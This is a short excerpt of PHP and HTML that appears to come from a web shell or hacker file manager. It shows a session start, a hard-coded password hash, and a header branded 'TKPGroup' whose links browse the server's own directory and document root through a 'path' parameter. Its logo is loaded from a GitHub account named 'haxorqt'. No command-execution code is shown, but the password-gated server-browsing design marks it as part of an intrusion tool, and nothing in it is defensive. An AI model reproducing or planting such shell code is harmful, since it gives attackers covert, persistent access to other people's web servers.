...
session_start();
define('APP_VER', '0.8');
$password = defined('PW') ? PW : '12be9b20bba24b6c5fd80e1abda2e317';
...
<header class="container mx-auto flex items-center justify-between p-4">
    <a href="?path=<?=urlencode($self_dir)?>" class="flex items-center">
        <h1 class="text-xl sm:text-2xl lg:text-3xl font-bold">TKPGroup</h1>
    </a>
    <a href="?path=<?=urlencode($docroot)?>" class="flex items-center">
        <img alt="Logo App" class="h-20 md:h-20" src="https://raw.githubusercontent.com/haxorqt/haxorqt/refs/heads/main/awikwok.gif"/>
    </a>
</header>
